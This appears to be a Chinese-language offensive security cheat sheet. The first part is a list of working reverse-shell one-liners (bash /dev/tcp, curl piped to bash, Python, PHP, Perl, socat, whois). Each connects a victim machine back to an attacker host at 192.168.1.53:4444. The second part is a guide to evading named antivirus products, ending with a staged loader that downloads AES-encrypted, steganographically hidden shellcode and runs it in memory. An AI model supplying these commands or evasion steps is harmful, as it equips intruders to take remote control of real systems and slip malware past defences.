ShellCode 是指一段小型的机器代码，通常用于在计算机系统中执行特定的恶意操作。

## 1. 监听端口

Netcat 侦听端口用于接收反弹 `shell`

```
nc -lnvp 4444
```

## 2. 反弹 Shell

**Bash**

```
bash -i >& /dev/tcp/<host>/4444 0>&1
```

**Curl 反弹**
开启 Web 服务

```
┌──(root㉿kali)-[~]
└─#  systemctl start apache2.service
```

将反弹 Shell 写入 HTML 文件

```
┌──(root㉿kali)-[/var/www/html]
└─# vim bash.html   
```

```
bash -i >& /dev/tcp/192.168.1.53/4444 0>&1
```

受害者下载并运行攻击者的文件

```
[root@centos ~]# curl 192.168.1.53/bash.html | bash
```

**Whois 反弹**

下载 `whois` 

```
[root@centos ~]# yum install -y whois
```

反弹的 Shell 并执行命令

```
[root@centos ~]# whois -h 192.168.1.53 -p 4444 [command]
```

**Python 反弹**

```
[root@centos ~]# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.53",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP 反弹**

安装 `php`

```
[root@centos ~]# yum install php -y
```

反弹 Shell

```
[root@centos ~]# php -r '$sock=fsockopen("192.168.1.53",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Socat 反弹**

安装 `socat`

```
[root@centos ~]# yum install -y socat
```

反弹 Shell

```
[root@centos ~]# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.53:4444
```

**Perl 反弹**

```
[root@centos ~]# perl -e 'use Socket;$i="192.168.1.53";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 3. Bypass

国内常见查杀软件：

1. Widnwos Defender
2. 360 安全卫士
3. 火绒安全软件
4. 腾讯电脑管家

### 3.1. 理论

### 3.1.1 识别方式

1. 特征码

2. 行为

3. 内存（内存中要运行原始代码，更易识别）

   > 目前杀软中卡巴斯基会对内存进行识别

### 3.1.2 免杀方式

1. 特征免杀（学习成本高，需要有源码，懂开发）

   > 修改源码或 PE 文件
   >
   > 重编译，增加混淆，加密

2. 分离免杀（通用，把恶意代码和程序分开）

   > 写一个加载器（本身不含有恶意代码）
   >
   > 在 Web 放置加密的恶意代码
   >
   > 使目标执行加载器（要加一些混淆，行为不要太明显）
   >
   > 1. 下载加密的恶意代码
   > 2. 解密恶意代码
   > 3. 将恶意代码放入内存
   > 4. 执行恶意代码

3. 加壳免杀（简单，付费，越冷门越好用）

   > 对恶意程序进行加壳，使之无法被反编译，达到免杀的效果
   >
   > UPX 加壳（需要手动修改特征）

4. 花指令免杀（修改汇编指令）

   > 把一条命令执行的步骤拆分为多个步骤
   >
   > 常用步骤替换为相同效果的冷门步骤
   >
   > 加 nop

5. 内存免杀（内存中执行的恶意代码是原始代码）

   > 使用编码器改变恶意程序的代码，使之不同于源代码，但执行效果相同
   >
   > msf 有一款 x86/shikata_ga_nai （由于太多人使用，已经被杀软识别）

### 3.2. 实战

### 3.2.1. 分离免杀

1. 使用 cs 或者 msf 生成 shellcode

2. 对 shellcode 进行 aes 加密，并将密钥写入到加载器（写入到加载器的密钥要做一个随机切割，避免被识别）

3. 将加密后的密文隐写到正常文件中（几乎所有的文件都可以隐写，这里为了方便直接保存到 shellcode.txt 中）

4. 执行加载器 `loader`

   > 1. 下载隐写后的文件
   > 2. 读取隐写的密文
   > 3. 解密恶意代码
   > 4. 将恶意代码放入内存
   > 5. 执行恶意代码

---

**References**

- [Reverse Shell Generator](https://www.revshells.com/)

